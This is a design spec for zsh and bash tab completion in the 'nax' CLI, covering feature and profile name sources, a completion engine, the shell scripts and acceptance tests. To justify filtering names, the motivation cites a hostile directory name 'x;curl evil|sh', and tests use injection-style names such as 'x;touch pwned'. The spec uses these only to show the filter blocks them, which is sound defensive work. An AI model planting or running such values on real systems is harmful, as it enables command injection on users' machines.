# SPEC: cli-completion — zsh and bash tab completion for nax, with feature and profile names

## Summary

Add shell tab completion to the `nax` CLI for zsh and bash. `nax completion zsh` / `nax completion bash` prints a script the user loads once from their shell rc file. On each Tab the script calls a hidden `nax __complete -- <words>` command, which walks commander's own command tree to complete subcommands and flags at any depth, and completes values: feature names for every `-f/--feature` option, profile names for every `--profile` option (comma-aware, so `--profile a,<Tab>` completes the next name), feature names for `nax features resolve [name]`, and profile names for `nax config profile show|use <name>`. When nax offers nothing, both shells fall back to normal file completion, which covers `--from <spec-path>` and `-d <path>`.

## Motivation

`nax run -f <feature>`, `nax plan -f <feature> --from <spec>` and about twenty other commands take a feature name, and `run`, `plan`, `chat`, `agents run` and `bot` take `--profile <name>`. Feature names are long (`acceptance-target-protection`), this repo has about 280 of them under `.nax/features/`, and profiles live in two directories (`~/.nax/profiles/` and `<project>/.nax/profiles/`). Today every name is typed by hand, and a typo only fails once the command runs. nax uses commander 13, which has no built-in shell completion, and nothing in the repo provides one.

## Design

### Integration

Symbols this feature only reads (verified on main `35b362bc5`):

- `findProjectDir(startDir: string): string | null` — `packages/nax/src/config/paths/index.ts`, exported from the `@/config` barrel. Walks up from `startDir` and returns the nearest `.nax` directory that holds `config.json` (never the global config dir). The project root is its parent.
- `featuresDir(root: string): string` — same file, exported from `@/config`. Returns `<root>/.nax/features`. It is the required SSOT for that path (`check:feature-dir-ssot`); never join `".nax", "features"` by hand.
- `listProfiles(projectRoot: string): Promise<ProfileEntry[]>` — `packages/nax/src/config/profile.ts`, exported from `@/config`. Scans `<globalConfigDir()>/profiles` and `<projectConfigDir(projectRoot)>/profiles` for `*.json` files and returns `{ name, path }` entries, skipping a directory it cannot read. It is the same scan `loadProfile` validates names against. `globalConfigDir()` honours `NAX_GLOBAL_CONFIG_DIR`.
- commander 13.1.0: `Command.commands`, `Command.options`, `Command.name()`, `Command.parent`, and `program.createHelp().visibleCommands(cmd)` / `.visibleOptions(cmd)`. `visibleCommands` omits commands registered `{ hidden: true }` but adds the implicit `help` command on a command that has subcommands; `visibleOptions` omits options marked `.hideHelp()` (for example `run`'s `--chat-asks`) and includes `-h, --help` (and `-V, --version` on the root). `Option.long`, `Option.short`, `Option.required` (value required) and `Option.optional` (value optional) say whether an option consumes the next word. A command parsed as `__complete -- run -f ""` receives `["run", "-f", ""]` as its variadic argument; nothing after `--` is read as an option.
- `bin/nax.ts` builds one `program` (`new Command()`), registers every command, then calls `await program.parseAsync(process.argv)` at the end. Commands from `src/cli` are registered with `registerXCommand(program, deps)` functions exported from the `src/cli` barrel (for example `registerGatesCommand(program, deps = _gatesCliDeps)` in `src/cli/gates.ts`, whose `deps` carries `log`, `logErr`, `exit`). `chat` is registered `{ isDefault: true }`; an explicit `__complete` or `completion` word still routes to its own command.

No existing symbol changes shape.

### Approach

Completion lives in a new directory module `packages/nax/src/cli/completion/` with a barrel `index.ts`, re-exported from the `src/cli` barrel. There is no `src/cli/completion.ts`, so the one-module-per-name rule holds. Files inside `src/cli/completion/` import each other relatively and import config symbols from the `@/config` barrel; they never import `@/cli` (that barrel re-exports completion, which would close an import cycle).

All candidate lists are sorted with the default `Array.prototype.sort()` (UTF-16 code-unit order) and de-duplicated.

**Value sources (US-001)** — `values.ts`:

```ts
/** Names of the directories under featuresDir(<project root found from startDir>). */
export function listFeatureNames(startDir: string): Promise<string[]>;
/** De-duplicated names from listProfiles(<project root found from startDir, else startDir>). */
export function listProfileNames(startDir: string): Promise<string[]>;
```

The project root is the parent of `findProjectDir(startDir)`. Feature names are the directory entries under the features directory that `validateFeatureName` (`src/utils/feature-name.ts`, pattern `^[a-zA-Z0-9][a-zA-Z0-9._-]{0,127}$`) accepts, so dot-directories and any name `nax run` would reject are skipped; this is wider than `features resolve`'s candidate filter `features resolve`'s candidate filter (directories holding `prd.json` or `spec.md`), because `nax plan -f <name>` names a feature before it has a `prd.json`. Profile names are kept only when they match `^[A-Za-z0-9][A-Za-z0-9._-]*$`. **Why both filters:** a candidate is inserted into the user's command line as shell text, and a cloned repo can hold a directory or profile named like `x;curl evil|sh`; only names made of shell-inert characters are ever offered. Outside a project, `listFeatureNames` returns `[]` and `listProfileNames` passes `startDir` to `listProfiles`, so only global profiles are found.

**Engine (US-002)** — `engine.ts`:

```ts
export interface CompletionSources {
  cwd: () => string;
  home: () => string;
  features: (startDir: string) => Promise<string[]>;
  profiles: (startDir: string) => Promise<string[]>;
}
export function completeWords(program: Command, words: readonly string[], sources: CompletionSources): Promise<string[]>;
```

`words` are the shell words after `nax`; the last element is the word under the cursor (possibly `""`). The result holds only candidates that start with the current word. Rules, in order:

1. **Walk** every word except the last, starting at `program`, tracking a pending option. If an option is pending, the word is its value and the option stops pending. Otherwise: a word equal to the name of a visible subcommand of the current command descends into it; a word equal to the short or long flag of a value-taking option (`required || optional`) of the current command or an ancestor makes that option pending (an option whose value is optional, such as `chat --resume [id]`, does not take a following word that starts with `-`; that word is walked normally); any other word starting with `-` is skipped; any other word is skipped and marks the walk stuck, after which no further descent happens.
2. **Project directory**: the start directory for sources is the value of the last `--dir` option (long flag `--dir`, any short flag) seen during the walk. A value of `~` becomes `sources.home()`, and a leading `~/` is replaced by `sources.home()` plus `/`. A relative value is then resolved against `sources.cwd()`. With no `--dir`, the start directory is `sources.cwd()`.
3. **Option value**: if an option with a required value is still pending when the walk ends, or one with an optional value is pending and the current word does not start with `-`, complete its value by long flag: `--feature` -> `sources.features(startDir)`; `--profile` -> `sources.profiles(startDir)`, comma-aware (below); any other option -> `[]`.
4. **Flags**: else, if the current word starts with `-`, return every short and long flag of `visibleOptions(reached command)`.
5. **Subcommands**: else, if the reached command has visible subcommands and the walk is not stuck, return their names, excluding the implicit `help` command.
6. **Positional values**: else, if the walk is not stuck, by the reached command's path from the root: `features resolve` -> features; `config profile show` and `config profile use` -> profiles. Anything else -> `[]`.

Comma-aware profiles: when the current word contains a comma, the prefix is everything up to and including the last comma, the partial name is the rest, names already listed in the prefix are excluded, and each candidate is `prefix + name`. So `fast,s` with profiles `cheap, fast, slow` yields `fast,slow`. bash's default `COMP_WORDBREAKS` has no comma and zsh treats the word whole, so both shells see the full `fast,slow`.

**Shell scripts (US-003)** — `scripts.ts`:

```ts
export const SUPPORTED_SHELLS: readonly ["bash", "zsh"];
export type CompletionShell = (typeof SUPPORTED_SHELLS)[number];
export function completionScript(shell: CompletionShell): string;
```

The bash script defines `_nax_complete`, which runs `nax __complete -- "${COMP_WORDS[@]:1:COMP_CWORD}" 2>/dev/null`, reads the output line by line into `COMPREPLY` (skipping empty lines), and is registered with `complete -o default -F _nax_complete nax` (so an empty reply falls back to file names). Worked skeleton:

```bash
_nax_complete() {
  local line
  COMPREPLY=()
  while IFS= read -r line; do
    [[ -n $line ]] && COMPREPLY+=("$line")
  done < <(nax __complete -- "${COMP_WORDS[@]:1:COMP_CWORD}" 2>/dev/null)
}
complete -o default -F _nax_complete nax
```

Reading line by line (not `COMPREPLY=($(...))`) keeps a candidate from being glob-expanded; `mapfile` is avoided because macOS ships bash 3.2.

The zsh script defines `_nax`, which runs `nax __complete -- "${(@)words[2,CURRENT]}" 2>/dev/null`, splits the output on newlines, drops empty lines, and passes the candidates to `compadd` without `-Q`, so zsh quotes anything it inserts; with no candidates it calls `_files`. It registers with `compdef _nax nax` when `compdef` is defined; when it is not (compinit not loaded) it prints a one-line hint to stderr containing `autoload -Uz compinit && compinit` and returns 0, rather than loading compinit itself (which writes `~/.zcompdump`). Worked skeleton:

```zsh
_nax() {
  local -a candidates
  candidates=("${(@f)$(nax __complete -- "${(@)words[2,CURRENT]}" 2>/dev/null)}")
  candidates=(${candidates:#})
  if (( ${#candidates} )); then compadd -- "${candidates[@]}"; else _files; fi
}
if (( $+functions[compdef] )); then
  compdef _nax nax
else
  print -u2 "nax completion: add 'autoload -Uz compinit && compinit' before this line in ~/.zshrc"
fi
```

**Commands (US-004)** — `register.ts`:

```ts
export interface CompletionCliDeps {
  write: (text: string) => void;    // stdout
  writeErr: (text: string) => void; // stderr
  exit: (code: number) => void;
  sources: CompletionSources;
}
export const _completionCliDeps: CompletionCliDeps;
export function registerCompletionCommand(program: Command, deps?: CompletionCliDeps): void;
```

`_completionCliDeps` writes to `process.stdout` / `process.stderr`, exits with `process.exit`, and uses sources `cwd: () => process.cwd()`, `home: () => os.homedir()`, `features: listFeatureNames`, `profiles: listProfileNames`. `registerCompletionCommand` registers two commands:

- `__complete [words...]`, `{ hidden: true }`. The action awaits `completeWords(program, words, deps.sources)` and writes the candidates joined by `\n` plus a trailing `\n` in one `deps.write` call; with no candidates it writes nothing. It never writes to stderr and never exits non-zero: a thrown error yields no output.
- `completion <shell>`, visible. For a shell in `SUPPORTED_SHELLS` it writes `completionScript(shell)` in one `deps.write` call. For any other value it writes `unsupported shell "<shell>" (supported: <SUPPORTED_SHELLS joined by ", ">)` to `deps.writeErr`, calls `deps.exit(1)`, and returns without writing to stdout. Its help text (added with commander's `addHelpText("after", ...)`) shows the two install lines: `eval "$(nax completion zsh)"` for `~/.zshrc` and `eval "$(nax completion bash)"` for `~/.bashrc`.

`bin/nax.ts` calls `registerCompletionCommand(program)` once, after every other command is registered and before `parseAsync`.

**Testing note.** `.nax/rules/forbidden-patterns-tests.md` discourages spawning the full `nax` process. Importing `bin/nax.ts` runs the CLI, so the only way to prove `bin/nax.ts` wires `registerCompletionCommand` is to spawn it. US-004 limits spawning to its seam ACs (8-11), following the existing `spawnNax` helper in `test/unit/cli/run-publish-override.test.ts` (with `NAX_GLOBAL_CONFIG_DIR` set to a temp dir and its 30 s `CLI_PROCESS_TIMEOUT_MS`). Every other US-004 AC uses injected `deps`. The US-003 shell tests spawn `bash` / `zsh`, never `nax`: a stub script named `nax` stands in for it.

### CLI Behavior

| Command | stdout | stderr | exit |
|:---|:---|:---|:---|
| `nax completion bash` | the bash script | empty | 0 |
| `nax completion zsh` | the zsh script | empty | 0 |
| `nax completion fish` (any other shell) | empty | `unsupported shell "fish" (supported: bash, zsh)` | 1 |
| `nax __complete -- <words>` | one candidate per line, or nothing | empty | 0 |

Example, in this repo:

```
$ nax __complete -- run -f acceptance-t
acceptance-target-protection
$ nax __complete -- run --profile advisor-opus,advisor-s
advisor-opus,advisor-sonnet
advisor-opus,advisor-sonnet-warm
```

### Failure Handling

| Case | Behaviour | Story |
|:---|:---|:---|
| Start directory is not inside a nax project | `listFeatureNames` returns `[]`; `listProfileNames` returns global profiles only | US-001 |
| Project has no `.nax/features` directory | `listFeatureNames` returns `[]` | US-001 |
| Global profiles directory missing | `listProfileNames` returns project profiles only, no error | US-001 |
| A walked word names no subcommand | no subcommand candidates; result `[]` unless the current word is a flag or an option value | US-002 |
| A source throws during `__complete` | no stdout, no stderr, no non-zero exit | US-004 |
| No candidates | `__complete` writes nothing; bash falls back to file names (`-o default`), zsh calls `_files` | US-003, US-004 |
| `nax completion <unknown shell>` | stderr `unsupported shell "<shell>" (supported: bash, zsh)`, exit 1, no stdout | US-004 |
| zsh `compdef` not defined when the script loads | stderr hint naming `autoload -Uz compinit && compinit`, script returns 0 | US-003 |
| `nax` writes to stderr during a Tab | the scripts discard it (`2>/dev/null`) | US-003 |

## Out of Scope

- fish, PowerShell and other shells; only bash and zsh scripts are generated.
- Caching feature or profile lists between Tab presses; every Tab runs `nax __complete` afresh, which costs one nax start (about 0.2 s warm on macOS, up to about 1 s cold).
- The `--option=value` form (`--feature=acc<Tab>`); only the separate-word form `--feature acc<Tab>` completes values.
- Value completion for options other than `--feature` and `--profile` (for example `--agent`, `--model`, `--gate`); those values get no nax candidates and fall back to file completion.
- Expanding a `--dir` value beyond a leading `~`: quoted values, `$VAR` and `~user` forms are taken literally.
- Descriptions next to candidates in the zsh menu; candidates are plain names.
- Editing the user's `~/.zshrc` or `~/.bashrc`; the user adds the `eval` line by hand.
- Positional completion for `features create <name>`, `plan [description]` and every other positional argument not named in the Design's positional-value rule.
- Command aliases; nax registers none, and the walk matches subcommand names only.
- Words after the cursor: a `-d <dir>` typed after the word being completed is not seen, so the start directory falls back to the current directory.
- Completing the local build invoked as `bun bin/nax.ts`; the scripts complete only the command name `nax`.
- Replacing or upgrading commander.

## Stories

**US-001 — feature and profile name sources.** Workdir: `packages/nax`. No dependencies. Creates `src/cli/completion/values.ts` with `listFeatureNames(startDir)` and `listProfileNames(startDir)` (the latter built on the existing `listProfiles`) and the `src/cli/completion/index.ts` barrel exporting both.

**US-002 — the completion engine.** Workdir: `packages/nax`. Depends on US-001 (it exports from the completion barrel US-001 creates). Creates `src/cli/completion/engine.ts` with `completeWords` and `CompletionSources`, a pure function over a commander program and injected sources, and exports both from the completion barrel.

**US-003 — the bash and zsh scripts.** Workdir: `packages/nax`. Depends on US-001 (it exports from the completion barrel US-001 creates). Creates `src/cli/completion/scripts.ts` with `completionScript`, `SUPPORTED_SHELLS` and `CompletionShell`, exported from the completion barrel.

**US-004 — `nax __complete`, `nax completion <shell>` and wiring into `bin/nax.ts`.** Workdir: `packages/nax`. Depends on US-001, US-002, US-003 (its default sources are US-001's functions, `__complete` calls US-002's `completeWords`, `completion <shell>` writes US-003's `completionScript`). Creates `src/cli/completion/register.ts` (`registerCompletionCommand`, `CompletionCliDeps`, `_completionCliDeps`), adds `registerCompletionCommand`, `CompletionCliDeps` and `_completionCliDeps` to the completion barrel, exports the completion barrel's public symbols from the `src/cli` barrel (so `bin/nax.ts` imports through `../src/cli`, never a deep path), and calls `registerCompletionCommand(program)` in `bin/nax.ts` after every other command is registered.

### Context Files

**US-001**
- `packages/nax/src/config/profile.ts` — `listProfiles`
- `packages/nax/src/config/paths/index.ts` — `findProjectDir`, `featuresDir`, `globalConfigDir`
- `packages/nax/src/cli/features-resolve.ts` — `discoverCandidates`, the existing feature-dir listing
- `packages/nax/test/unit/cli/config-profile.test.ts` — how profile tests isolate the global config dir

**US-002**
- `packages/nax/src/cli/completion/index.ts` — created by US-001, the barrel US-002 exports from
- `packages/nax/bin/nax.ts` — real option shapes (`run`'s `-f, --feature`, `--profile`, `-d, --dir`, hidden `--chat-asks`)
- `packages/nax/src/cli/gates.ts` — a commander command built with `Command` and `Option`

**US-003**
- `packages/nax/src/cli/completion/index.ts` — created by US-001, the barrel US-003 exports from

**US-004**
- `packages/nax/src/cli/completion/index.ts` — created by US-001, gains the register exports here
- `packages/nax/bin/nax.ts` — `program` construction, command registration order, `parseAsync`
- `packages/nax/src/cli/gates.ts` — `registerGatesCommand` and its injectable `deps` pattern
- `packages/nax/src/cli/index.ts` — the `src/cli` barrel
- `packages/nax/test/unit/cli/run-publish-override.test.ts` — `spawnNax`, `CLI_PROCESS_TIMEOUT_MS`
- `packages/nax/src/cli/completion/engine.ts` — created by US-002, consumed here

### Creates

**US-001**
- `packages/nax/src/cli/completion/values.ts` — `listFeatureNames`, `listProfileNames`
- `packages/nax/src/cli/completion/index.ts` — completion barrel
- `packages/nax/test/unit/cli/completion/values.test.ts` — source tests

**US-002**
- `packages/nax/src/cli/completion/engine.ts` — `completeWords`, `CompletionSources`
- `packages/nax/test/unit/cli/completion/engine.test.ts` — engine rules against a fixture commander program

**US-003**
- `packages/nax/src/cli/completion/scripts.ts` — `completionScript`, `SUPPORTED_SHELLS`, `CompletionShell`
- `packages/nax/test/unit/cli/completion/scripts.test.ts` — runs the generated scripts in real bash and zsh with a stub `nax` on `PATH`

**US-004**
- `packages/nax/src/cli/completion/register.ts` — `registerCompletionCommand`, `CompletionCliDeps`, `_completionCliDeps`
- `packages/nax/test/unit/cli/completion/register.test.ts` — command actions with injected deps
- `packages/nax/test/integration/cli/cli-completion.test.ts` — spawns `bin/nax.ts` for the seam ACs 8-11

### Modifies

None. No story breaks an existing assertion. US-001 to US-003 only add new files and barrel exports in the new `src/cli/completion/` directory. US-004 adds one export block to `src/cli/index.ts` and one `registerCompletionCommand(program)` line to `bin/nax.ts`; no test pins the `src/cli` barrel's export list or the top-level command list, and `test/unit/cli/bin-nax-parse-async.test.ts` (which reads `bin/nax.ts` as text) asserts only `await program.parseAsync` and its try/catch wraps.

### Seams

- US-001 `listFeatureNames` and `listProfileNames` are consumed by US-004's `_completionCliDeps.sources`; US-004 ACs 8 and 9 spawn the real `bin/nax.ts __complete` against a temp project and a temp global config dir, with no stubs, proving both are wired.
- US-002 `completeWords` is consumed by US-004's `__complete` action; US-004 AC 1 enters at the parsed `__complete` command and ACs 8-9 at the real CLI.
- US-003 `completionScript` is consumed by US-004's `completion <shell>` action (US-004 AC 4). The scripts call the `__complete` protocol (`nax __complete -- <words>`), which US-003 ACs 4 and 10 pin as the exact argv a stub `nax` receives and US-004 ACs 1 and 8 pin from the receiving side.
- US-004 `registerCompletionCommand` is wired into `bin/nax.ts`; US-004 ACs 8-11 enter at the real CLI.

## Acceptance Criteria

### US-001

1. [unit] `listFeatureNames(root)` for a temp project with `.nax/config.json` and directories `.nax/features/beta` and `.nax/features/alpha` resolves `["alpha", "beta"]`.
2. [unit] `listFeatureNames` called with `<root>/src/deep` (a nested subdirectory of that project) resolves `["alpha", "beta"]`.
3. [unit] With a regular file `.nax/features/notes.md` and a directory `.nax/features/.cache` added, `listFeatureNames(root)` still resolves `["alpha", "beta"]`.
4. [unit] `listFeatureNames` for a temp directory with no `.nax/config.json` in it or any ancestor resolves `[]`.
5. [unit] `listFeatureNames` for a project with `.nax/config.json` and no `.nax/features` directory resolves `[]`.
6. [unit] With `NAX_GLOBAL_CONFIG_DIR` pointing at a temp dir whose `profiles/` holds `g1.json` and `shared.json`, and a project whose `.nax/profiles/` holds `p1.json` and `shared.json`, `listProfileNames(root)` resolves `["g1", "p1", "shared"]`.
7. [unit] With `profiles/g1.env` added to that global profiles dir, `listProfileNames(root)` still resolves `["g1", "p1", "shared"]`.
8. [unit] `listProfileNames` for a temp directory outside any nax project resolves the global names only, `["g1", "shared"]`.
9. [unit] `listProfileNames(<root>/src/deep)` resolves `["g1", "p1", "shared"]`.
10. [unit] With `NAX_GLOBAL_CONFIG_DIR` pointing at a temp dir that has no `profiles/` directory, `listProfileNames(root)` resolves `["p1", "shared"]`.
11. [unit] With a directory `.nax/features/x;touch pwned` added next to `alpha` and `beta`, `listFeatureNames(root)` still resolves `["alpha", "beta"]`.
12. [unit] With a file `.nax/profiles/bad name$x.json` added to the project, `listProfileNames(root)` still resolves `["g1", "p1", "shared"]`.

### US-002

The ACs use a fixture commander program built in the test: `run` with `-f, --feature <name>`, `--profile <name>`, `-d, --dir <path>`, `--from <spec-path>`, and a hidden option `--secret-opt <x>` (`.hideHelp()`); `plan` with `--resume [id]`; `init` with `-f, --force`; `features` with subcommands `create <name>`, `list`, `resolve [name]`; `config` with subcommand `profile`, which has `show <name>` and `use <name>`; and a command `secret` registered `{ hidden: true }`. Sources: `cwd` returns `/w`, `home` returns `/home/u`, `features` resolves `["alpha", "beta"]`, `profiles` resolves `["cheap", "fast", "slow"]`.

1. [unit] `completeWords(program, [""], sources)` resolves `["config", "features", "init", "plan", "run"]` (no `secret`, no `help`).
2. [unit] `completeWords(program, ["features", ""], sources)` resolves `["create", "list", "resolve"]`.
3. [unit] `completeWords(program, ["run", "-f", ""], sources)` resolves `["alpha", "beta"]`.
4. [unit] `completeWords(program, ["run", "--feature", "be"], sources)` resolves `["beta"]`.
5. [unit] `completeWords(program, ["init", "-f", ""], sources)` resolves `[]` and does not call `sources.features`, because `init`'s `-f` is the boolean `--force`.
6. [unit] `completeWords(program, ["run", "--profile", ""], sources)` resolves `["cheap", "fast", "slow"]`.
7. [unit] `completeWords(program, ["run", "--profile", "fast,"], sources)` resolves `["fast,cheap", "fast,slow"]`.
8. [unit] `completeWords(program, ["run", "--profile", "fast,s"], sources)` resolves `["fast,slow"]`.
9. [unit] `completeWords(program, ["run", "--fe"], sources)` resolves `["--feature"]`.
10. [unit] `completeWords(program, ["run", "-"], sources)` resolves `["--dir", "--feature", "--from", "--help", "--profile", "-d", "-f", "-h"]` (no `--secret-opt`).
11. [unit] `completeWords(program, ["features", "resolve", ""], sources)` resolves `["alpha", "beta"]`.
12. [unit] `completeWords(program, ["config", "profile", "use", "f"], sources)` resolves `["fast"]`.
13. [unit] `completeWords(program, ["run", "--from", ""], sources)` resolves `[]`.
14. [unit] `completeWords(program, ["run", "--profile", "fast", "-f", ""], sources)` resolves `["alpha", "beta"]` (the profile value is consumed, not read as a subcommand).
15. [unit] `completeWords(program, ["run", "--from", "-f", ""], sources)` resolves `[]` and does not call `sources.features` (`-f` is consumed as the value of `--from`).
16. [unit] `completeWords(program, ["features", "bogus", ""], sources)` resolves `[]`.
17. [unit] For `["run", "-d", "/tmp/x", "-f", ""]`, `completeWords` calls `sources.features` with `"/tmp/x"`.
18. [unit] For `["run", "-d", "sub", "-f", ""]`, `completeWords` calls `sources.features` with `"/w/sub"`.
19. [unit] For `["run", "-d", "~/proj", "-f", ""]`, `completeWords` calls `sources.features` with `"/home/u/proj"`.
20. [unit] For `["run", "-f", ""]`, `completeWords` calls `sources.features` with `"/w"` (the `sources.cwd()` result).
21. [unit] `completeWords(program, ["features", "resolve", "alpha", ""], sources)` resolves `[]` and does not call `sources.features`.
22. [unit] `completeWords(program, ["plan", "--resume", "-"], sources)` resolves `["--help", "--resume", "-h"]` (an optional-value option does not take a word starting with `-`).

### US-003

The ACs evaluate `completionScript(shell)` in a real shell process (`bash --norc --noprofile` or `zsh -f`) with a temp directory first on `PATH` holding an executable stub named `nax` that records its arguments, one per line, to a file and prints a configured candidate list. Each shell's tests are skipped when that shell is not on `PATH`.

1. [unit] After evaluating `completionScript("bash")` in bash, the builtin `complete -p nax` exits 0 and its output names the function `_nax_complete`.
2. [unit] In that bash session, the `complete -p nax` output includes the option `-o default`.
3. [unit] In bash, with the stub printing `alpha` and `beta` on separate lines, `COMP_WORDS=(nax run -f a)` and `COMP_CWORD=3`, calling `_nax_complete` sets `COMPREPLY` to exactly the two elements `alpha` and `beta`.
4. [unit] In that bash call, the stub receives exactly the arguments `__complete`, `--`, `run`, `-f`, `a`.
5. [unit] In bash, with `COMP_WORDS=(nax run -f "")` and `COMP_CWORD=3`, the stub receives five arguments, the last being the empty string.
6. [unit] In bash, with a stub that writes `boom` to stderr and prints `alpha`, calling `_nax_complete` leaves the bash process's stderr empty and `COMPREPLY` equal to the single element `alpha`.
7. [unit] In zsh with a stub function `compdef` that records its arguments, evaluating `completionScript("zsh")` calls `compdef` with the arguments `_nax` and `nax`.
8. [unit] Evaluating `completionScript("zsh")` in `zsh -f` with no `compdef` defined exits 0 and writes a stderr line containing `autoload -Uz compinit && compinit`.
9. [unit] In zsh, with stub functions `compdef`, `compadd` and `_files` that record their calls, the stub `nax` printing `alpha` and `beta`, `words=(nax run -f a)` and `CURRENT=4`, calling `_nax` passes `alpha` and `beta` to `compadd` as its candidates.
10. [unit] In that zsh call, the stub `nax` receives exactly the arguments `__complete`, `--`, `run`, `-f`, `a`.
11. [unit] In zsh, with the stub `nax` printing nothing, calling `_nax` calls `_files` once and does not call `compadd`.
12. [unit] In zsh, with a stub `nax` that writes `boom` to stderr and prints `alpha`, calling `_nax` leaves the zsh process's stderr empty and passes `alpha` to `compadd`.
13. [unit] `SUPPORTED_SHELLS` equals `["bash", "zsh"]`.
14. [unit] In the zsh call of AC 9, the recorded `compadd` arguments do not include `-Q`.

### US-004

ACs 1-7 build a commander program in the test with a command `run` that has `-f, --feature <name>` and `--from <spec-path>`, pass it to `registerCompletionCommand(program, deps)` with recording `write`, `writeErr` and `exit`, and parse with `await program.parseAsync(args, { from: "user" })` (the actions are async). Help text is captured by `configureOutput({ writeOut })` on the `completion` command and `outputHelp()`, since `addHelpText` output is not part of `helpInformation()`. Unless an AC says otherwise, `deps.sources.features` resolves `["alpha", "beta"]`.

1. [unit] Parsing `["__complete", "--", "run", "-f", ""]` calls `deps.write` once, with `"alpha\nbeta\n"`.
2. [unit] With `deps.sources.features` rejecting, parsing `["__complete", "--", "run", "-f", ""]` makes no `deps.write` call, no `deps.writeErr` call, and no `deps.exit` call with a non-zero code.
3. [unit] Parsing `["__complete", "--", "run", "--from", ""]` makes no `deps.write` call.
4. [unit] Parsing `["completion", "zsh"]` calls `deps.write` once, with `completionScript("zsh")`.
5. [unit] Parsing `["completion", "fish"]` calls `deps.writeErr` with text containing `unsupported shell "fish" (supported: bash, zsh)`, calls `deps.exit` with `1`, and makes no `deps.write` call.
6. [unit] The help text of the registered `completion` command includes a zsh install line that `eval`s the output of `nax completion zsh` and names `~/.zshrc`.
7. [unit] The help text of the registered `completion` command includes a bash install line that `eval`s the output of `nax completion bash` and names `~/.bashrc`.
8. [cli] Spawning `bun bin/nax.ts __complete -- run -d <tmp> -f ""`, where `<tmp>` is a project with `.nax/config.json` and feature directories `alpha` and `beta`, exits 0 with stdout `"alpha\nbeta\n"` and empty stderr.
9. [cli] Spawning `bun bin/nax.ts __complete -- run -d <tmp> --profile ""` with `NAX_GLOBAL_CONFIG_DIR` set to a temp dir whose `profiles/` holds `fast.json` exits 0 with stdout `"fast\n"` (`<tmp>` is a project with `.nax/config.json` and no `.nax/profiles/`).
10. [cli] In the command list printed by spawning `bun bin/nax.ts --help`, no line's first word is `__complete`.
11. [cli] In the command list printed by spawning `bun bin/nax.ts --help`, one line's first word is `completion`.
